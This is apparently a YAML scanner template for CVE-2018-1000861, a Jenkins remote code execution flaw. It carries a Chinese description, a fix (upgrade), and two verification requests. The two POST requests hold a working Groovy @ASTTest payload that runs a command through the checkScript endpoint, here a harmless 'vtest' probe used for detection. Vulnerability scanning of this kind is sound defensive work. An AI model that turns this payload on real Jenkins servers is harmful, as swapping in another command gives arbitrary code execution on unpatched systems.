app: Jenkins
query: app:"Jenkins"
meta:
  name: CVE-2018-1000861 Jenkins远程代码执行
  level: 4
  tags:
    - remote_code_execution
  description: Jenkins使用Stapler框架开发，其允许用户通过URL PATH来调用一次public方法。由于这个过程没有做限制，攻击者可以构造一些特殊的PATH来执行一些敏感的Java方法。
  homepage: https://www.jenkins.io/
  author: 一曲成殇
  references: https://www.freebuf.com/news/242764.html
  solution: 升级软件版本
  steps:
    verify_steps:
      type: or
      verify:
        - request:
            method: POST
            path: /securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=import+groovy.transform.*%0a%40ASTTest(value%3d%7bassert+java.lang.Runtime.getRuntime().exec(%22vtest%22)%7d)%0aclass+Person%7b%7d
            redirect: false
            header: [ ]
            params: ""
          response:
            - name: body
              value: No such file or directory
              type: contains
        - request:
            method: POST
            path: /securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=import+groovy.transform.*%0a%40ASTTest(value%3d%7b+%22vtest%22.execute().text+%7d)%0aclass+Person%7b%7d
            redirect: true
            header: [ ]
            params: ""
          response:
            - name: body
              value: No such file or directory
              type: contains
  create_at: "2022-04-27 14:38:33"
